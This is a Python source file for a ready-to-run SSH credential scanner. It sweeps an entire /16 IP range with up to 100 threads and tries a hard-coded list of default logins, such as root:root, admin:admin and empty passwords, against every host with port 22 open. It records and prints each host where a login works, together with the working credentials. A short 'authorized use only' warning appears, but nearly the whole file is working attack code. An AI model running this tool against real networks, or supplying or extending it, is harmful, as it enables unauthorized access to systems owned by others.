import socket
import paramiko
import threading
import sys
from queue import Queue
from rich.console import Console
from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn
from rich.table import Table
from rich import box
import time
import logging
import argparse

# Initialize console for rich output
console = Console()

# Lion Banner ASCII Art
LION_BANNER = r"""
 ██████╗ ██████╗ ███╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗████╗  ██║██╔════╝██╔══██╗
██║     ██║   ██║██╔██╗ ██║█████╗  ██████╔╝
██║     ██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗
╚██████╗╚██████╔╝██║ ╚████║███████╗██║  ██║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                           
    ██████╗ ███████╗███╗   ██╗███████╗    
    ██╔══██╗██╔════╝████╗  ██║██╔════╝    
    ██████╔╝█████╗  ██╔██╗ ██║███████╗    
    ██╔══██╗██╔══╝  ██║╚██╗██║╚════██║    
    ██║  ██║███████╗██║ ╚████║███████║    
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝    
"""

# Warning Banner
console.print(LION_BANNER, style="bold yellow")
console.print(
    "[bold red]WARNING[/bold red]: This script is for educational/authorized use only.\n"
    "Unauthorized port scanning and login attempts may violate laws.\n"
    "Use this only on networks you have explicit permission to scan.",
    justify="center"
)

# Logging configuration
logging.basicConfig(level=logging.DEBUG, filename="ssh_scanner.log", filemode="w",
                    format="%(asctime)s - %(levelname)s - %(message)s")

# Argument Parsing
parser = argparse.ArgumentParser(description="SSH Credential Scanner")
parser.add_argument("ip_prefix", help="IP prefix (e.g., 192.168)")
parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (default: 100)")
parser.add_argument("-to", "--timeout", type=float, default=2.0, help="Connection timeout (default: 2.0 seconds)")
parser.add_argument("-r", "--retries", type=int, default=3, help="Number of retries for failed connections (default: 3)")
args = parser.parse_args()

# Configuration
queue = Queue()
MAX_THREADS = args.threads
TIMEOUT = args.timeout
RETRIES = args.retries
CREDENTIALS = [
    ('root', 'root'),
    ('admin', 'admin'),
    ('user', 'user'),
    ('guest', 'guest'),
    ('admin', 'password'),
    ('root', ''),
    ('admin', '')
]
FOUND_VULNERABLE = []  # Stores vulnerable hosts


def is_ssh_service(ip, port=22, timeout=2):
    """Check if the service running on port 22 is SSH."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        return "SSH" in banner
    except Exception:
        return False


def check_ssh(ip, progress, task_id):
    """Attempt to connect to the SSH service using provided credentials."""
    def attempt_login(username, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, username=username, password=password, timeout=TIMEOUT)
            return True
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
            return False
        finally:
            ssh.close()

    try:
        # Check if port 22 is open
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            if s.connect_ex((ip, 22)) != 0:
                return

        # Verify if the service is SSH
        if not is_ssh_service(ip):
            console.print(f"[red]\[!][/red] Non-SSH service detected on {ip}")
            return

        # Test credentials
        for username, password in CREDENTIALS:
            for _ in range(RETRIES):
                if attempt_login(username, password):
                    FOUND_VULNERABLE.append({
                        'ip': ip,
                        'username': username,
                        'password': password
                    })
                    console.print(
                        f"[green][+] Vulnerable host: {ip} - {username}:{password}[/green]"
                    )
                    logging.info(f"Vulnerable host detected: {ip} - {username}:{password}")
                    break
            else:
                continue
            break
    except Exception as e:
        console.print(f"[red]\[!][/red] Error checking {ip}: {e}")
        logging.error(f"Error checking {ip}: {e}")
    finally:
        progress.update(task_id, advance=1)


def worker(progress, task_id):
    """Worker function for multithreading."""
    while True:
        ip = queue.get()
        check_ssh(ip, progress, task_id)
        queue.task_done()


def show_results():
    """Display scan results in a table format."""
    if FOUND_VULNERABLE:
        vuln_table = Table(
            box=box.ROUNDED,
            title="[bold red]Vulnerable Hosts[/bold red]",
            show_header=True,
            header_style="bold white on red"
        )
        vuln_table.add_column("IP Address", style="cyan")
        vuln_table.add_column("Username", style="yellow")
        vuln_table.add_column("Password", style="yellow")
        for host in FOUND_VULNERABLE:
            vuln_table.add_row(
                host['ip'],
                host['username'],
                host['password']
            )
        console.print("\n")
        console.print(vuln_table)
    else:
        console.print("\n[bold yellow]No vulnerable hosts found.[/bold yellow]")


def main():
    try:
        ip_prefix = args.ip_prefix
        octets = ip_prefix.split('.')

        if len(octets) != 2 or not all(o.isdigit() and 0 <= int(o) <= 255 for o in octets):
            console.print("[red]\[!] Invalid IP format. Use [bold]xx.xx[/bold] (e.g., 192.168)[/red]")
            sys.exit(1)

        ips = [f"{ip_prefix}.{i}.{j}" for i in range(256) for j in range(256)]

        console.print(f"\n[bold]Scanning {len(ips)} IPs in range {ip_prefix}.x.x[/bold]")
        console.print(f"Testing credentials: [yellow]{len(CREDENTIALS)} combinations[/yellow]")
        console.print(f"Threads: [cyan]{MAX_THREADS}[/cyan], Timeout: [cyan]{TIMEOUT}s[/cyan], Retries: [cyan]{RETRIES}[/cyan]\n")

        # Start workers
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            transient=True
        ) as progress:
            task_id = progress.add_task("[cyan]Scanning...", total=len(ips))

            for _ in range(MAX_THREADS):
                threading.Thread(target=worker, args=(progress, task_id), daemon=True).start()

            for ip in ips:
                queue.put(ip)

            queue.join()

        show_results()
    except KeyboardInterrupt:
        console.print("\n[red]\[!] Scan interrupted![/red]")
        show_results()
        sys.exit(1)


if __name__ == "__main__":
    main()
